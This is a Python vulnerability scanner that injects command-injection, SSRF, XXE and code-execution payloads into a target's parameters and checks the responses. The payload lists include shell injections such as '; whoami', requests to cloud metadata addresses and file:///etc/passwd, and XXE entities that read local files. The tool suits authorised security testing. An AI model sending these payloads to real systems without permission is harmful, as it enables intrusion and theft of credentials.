#!/usr/bin/env python3
"""
Advanced Vulnerability Scanner - Command Injection, SSRF, XXE, RCE
Context7 reviewed: OWASP best practices applied
OWASP A03:2021 - Injection
"""

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError
import re
import urllib.parse
from typing import List, Dict, Any, Optional
import time


class AdvancedVulnerabilityScanner:
    """
    Advanced vulnerability scanner for complex attack vectors
    Tests Command Injection, SSRF, XXE, and RCE vulnerabilities
    """
    
    def __init__(self):
        self.connect_timeout = 3.0
        self.read_timeout = 5.0
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        
        # Command injection payloads
        # Context7: OWASP recommendation - test shell metacharacters
        self.cmd_injection_payloads = [
            '; whoami',
            '| whoami',
            '& whoami', 
            '&& whoami',
            '|| whoami',
            '` whoami `',
            '$( whoami )',
            '; ping -c 1 127.0.0.1',
            '| ping -c 1 127.0.0.1',
            '; sleep 5',
            '& timeout 5',
        ]
        
        # SSRF payloads
        # Context7: Test internal network access and cloud metadata
        self.ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://169.254.169.254',  # AWS metadata
            'http://metadata.google.internal',  # GCP metadata
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://[::1]',  # IPv6 localhost
            'file:///etc/passwd',
            'dict://127.0.0.1:11211',  # Memcached
        ]
        
        # XXE payloads
        # Context7: OWASP XXE prevention patterns
        self.xxe_payloads = [
            # Simple external entity
            '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
<root>&test;</root>''',
            
            # Parameter entity  
            '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root></root>''',
            
            # SSRF via XXE
            '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
<root>&xxe;</root>''',
        ]
        
        # RCE test patterns
        self.rce_indicators = [
            'root:',  # /etc/passwd
            'uid=',   # whoami output
            'PING',   # ping output
            'ttl=',   # ping output
            'Administrator',  # Windows whoami
        ]
    
    def _make_request(self, url: str, method: str = 'GET', **kwargs) -> requests.Response:
        """
        Make HTTP request with proper timeout and error handling
        Context7 pattern: separate connect/read timeouts
        """
        try:
            timeout = kwargs.pop('timeout', (self.connect_timeout, self.read_timeout))
            headers = kwargs.get('headers', {})
            if 'User-Agent' not in headers:
                headers['User-Agent'] = self.user_agent
            kwargs['headers'] = headers
            
            if method == 'GET':
                return requests.get(url, timeout=timeout, **kwargs)
            elif method == 'POST':
                return requests.post(url, timeout=timeout, **kwargs)
            else:
                raise ValueError(f"Unsupported method: {method}")
                
        except Timeout:
            raise
        except ConnectionError:
            raise
        except RequestException as e:
            raise
    
    def scan_target(self, target: str) -> Dict[str, Any]:
        """Run all advanced vulnerability tests on target"""
        results = {
            'command_injection': [],
            'ssrf': [],
            'xxe': [],
            'rce': []
        }
        
        print(f"[*] Starting advanced vulnerability scan on {target}")
        
        # Test Command Injection
        cmd_vulns = self.test_command_injection(target)
        results['command_injection'] = cmd_vulns
        
        # Test SSRF
        ssrf_vulns = self.test_ssrf(target)
        results['ssrf'] = ssrf_vulns
        
        # Test XXE
        xxe_vulns = self.test_xxe(target)
        results['xxe'] = xxe_vulns
        
        # Test RCE
        rce_vulns = self.test_rce(target)
        results['rce'] = rce_vulns
        
        return results
    
    # =================================================================
    # COMMAND INJECTION TESTS
    # =================================================================
    
    def test_command_injection(self, target: str) -> List[Dict]:
        """
        Test for OS command injection vulnerabilities
        Context7: OWASP command injection patterns
        """
        vulns = []
        
        # Find URL parameters
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            # No parameters to test
            return vulns
        
        for param_name in params.keys():
            for payload in self.cmd_injection_payloads[:5]:  # Test first 5
                try:
                    # Build test URL
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))
                    
                    # Send request
                    start_time = time.time()
                    resp = self._make_request(test_url)
                    elapsed = time.time() - start_time
                    
                    # Check for command injection indicators
                    if self._detect_command_injection(resp.text, payload, elapsed):
                        vulns.append({
                            'type': 'OS Command Injection',
                            'severity': 'CRITICAL',
                            'description': f'Command injection in parameter "{param_name}"',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': resp.text[:200] + '...' if len(resp.text) > 200 else resp.text,
                            'cwe': 'CWE-78',
                            'owasp_2021': 'A03:2021-Injection'
                        })
                        break  # Found vulnerability, move to next parameter
                    
                    time.sleep(0.5)  # Rate limit
                    
                except (Timeout, ConnectionError, RequestException):
                    continue
        
        return vulns
    
    def _detect_command_injection(self, response: str, payload: str, elapsed: float) -> bool:
        """Detect if command injection was successful"""
        
        # Check for command output indicators
        for indicator in self.rce_indicators:
            if indicator.lower() in response.lower():
                return True
        
        # Check for time-based injection (sleep/timeout)
        if ('sleep' in payload or 'timeout' in payload) and elapsed > 4:
            return True
        
        return False
    
    # =================================================================
    # SSRF TESTS
    # =================================================================
    
    def test_ssrf(self, target: str) -> List[Dict]:
        """
        Test for Server-Side Request Forgery vulnerabilities
        Context7: OWASP SSRF prevention patterns
        """
        vulns = []
        
        # Find URL parameters
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return vulns
        
        for param_name in params.keys():
            for ssrf_payload in self.ssrf_payloads[:5]:  # Test first 5
                try:
                    # Build test URL
                    test_params = params.copy()
                    test_params[param_name] = [ssrf_payload]
                    
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))
                    
                    # Send request
                    resp = self._make_request(test_url)
                    
                    # Check for SSRF indicators
                    if self._detect_ssrf(resp.text, ssrf_payload):
                        vulns.append({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'CRITICAL',
                            'description': f'SSRF in parameter "{param_name}"',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': ssrf_payload,
                            'evidence': 'Server made request to internal/external resource',
                            'cwe': 'CWE-918',
                            'owasp_2021': 'A10:2021-Server-Side Request Forgery'
                        })
                        break
                    
                    time.sleep(0.5)
                    
                except (Timeout, ConnectionError, RequestException):
                    continue
        
        return vulns
    
    def _detect_ssrf(self, response: str, payload: str) -> bool:
        """Detect if SSRF was successful"""
        
        # Check for AWS metadata indicators
        if 'ami-id' in response.lower() or 'instance-id' in response.lower():
            return True
        
        # Check for /etc/passwd content
        if 'root:' in response and 'bin/' in response:
            return True
        
        # Check for localhost indicators
        if '127.0.0.1' in payload and ('localhost' in response.lower() or 'loopback' in response.lower()):
            return True
        
        return False
    
    # =================================================================
    # XXE TESTS
    # =================================================================
    
    def test_xxe(self, target: str) -> List[Dict]:
        """
        Test for XML External Entity (XXE) vulnerabilities
        Context7: OWASP XXE prevention patterns
        """
        vulns = []
        
        for xxe_payload in self.xxe_payloads:
            try:
                # Send XML payload
                resp = self._make_request(
                    target,
                    method='POST',
                    data=xxe_payload,
                    headers={'Content-Type': 'application/xml'}
                )
                
                # Check for XXE indicators
                if self._detect_xxe(resp.text):
                    vulns.append({
                        'type': 'XML External Entity (XXE) Injection',
                        'severity': 'CRITICAL',
                        'description': 'XXE vulnerability detected - can read local files',
                        'url': target,
                        'payload': xxe_payload[:100] + '...',
                        'evidence': resp.text[:200] + '...' if len(resp.text) > 200 else resp.text,
                        'cwe': 'CWE-611',
                        'owasp_2021': 'A05:2021-Security Misconfiguration'
                    })
                    break
                
                time.sleep(0.5)
                
            except (Timeout, ConnectionError, RequestException):
                continue
        
        return vulns
    
    def _detect_xxe(self, response: str) -> bool:
        """Detect if XXE was successful"""
        
        # Check for /etc/passwd content
        if 'root:' in response and '/bin/' in response:
            return True
        
        # Check for AWS metadata
        if 'ami-id' in response.lower() or 'meta-data' in response.lower():
            return True
        
        return False
    
    # =================================================================
    # RCE TESTS
    # =================================================================
    
    def test_rce(self, target: str) -> List[Dict]:
        """
        Test for Remote Code Execution vulnerabilities
        Generic RCE detection patterns
        """
        vulns = []
        
        # RCE test payloads for common frameworks
        rce_payloads = [
            # Python eval/exec
            "__import__('os').system('whoami')",
            "eval('__import__(\"os\").system(\"whoami\")')",
            
            # PHP
            "<?php system('whoami'); ?>",
            "<?php phpinfo(); ?>",
            
            # Template injection
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
        ]
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return vulns
        
        for param_name in params.keys():
            for payload in rce_payloads[:5]:  # Test first 5
                try:
                    # Build test URL
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))
                    
                    # Send request
                    resp = self._make_request(test_url)
                    
                    # Check for RCE indicators
                    if self._detect_rce(resp.text, payload):
                        vulns.append({
                            'type': 'Remote Code Execution (RCE)',
                            'severity': 'CRITICAL',
                            'description': f'RCE in parameter "{param_name}"',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': resp.text[:200] + '...' if len(resp.text) > 200 else resp.text,
                            'cwe': 'CWE-94',
                            'owasp_2021': 'A03:2021-Injection'
                        })
                        break
                    
                    time.sleep(0.5)
                    
                except (Timeout, ConnectionError, RequestException):
                    continue
        
        return vulns
    
    def _detect_rce(self, response: str, payload: str) -> bool:
        """Detect if RCE was successful"""
        
        # Check for command execution indicators
        for indicator in self.rce_indicators:
            if indicator in response:
                return True
        
        # Check for template injection (7*7 = 49)
        if ('7*7' in payload or '7 * 7' in payload) and '49' in response:
            return True
        
        # Check for PHP info
        if 'phpinfo' in payload and ('PHP Version' in response or 'php' in response.lower()):
            return True
        
        return False
    
    def format_results(self, results: Dict) -> List[Dict]:
        """Format results for API response"""
        formatted = []
        
        # Command Injection
        for vuln in results.get('command_injection', []):
            formatted.append(vuln)
        
        # SSRF
        for vuln in results.get('ssrf', []):
            formatted.append(vuln)
        
        # XXE
        for vuln in results.get('xxe', []):
            formatted.append(vuln)
        
        # RCE
        for vuln in results.get('rce', []):
            formatted.append(vuln)
        
        return formatted


if __name__ == '__main__':
    # Test
    scanner = AdvancedVulnerabilityScanner()
    
    print("=" * 70)
    print("🔥 Testing Advanced Vulnerability Scanner")
    print("=" * 70)
    
    # Test on a sample target
    results = scanner.scan_target('http://testphp.vulnweb.com/listproducts.php?cat=1')
    formatted = scanner.format_results(results)
    
    print(f"\n[+] Found {len(formatted)} advanced vulnerabilities")
    for v in formatted:
        print(f"  [{v['severity']}] {v['type']}: {v.get('description', 'No description')}")
    
    print("\n✅ Advanced scanner ready!")
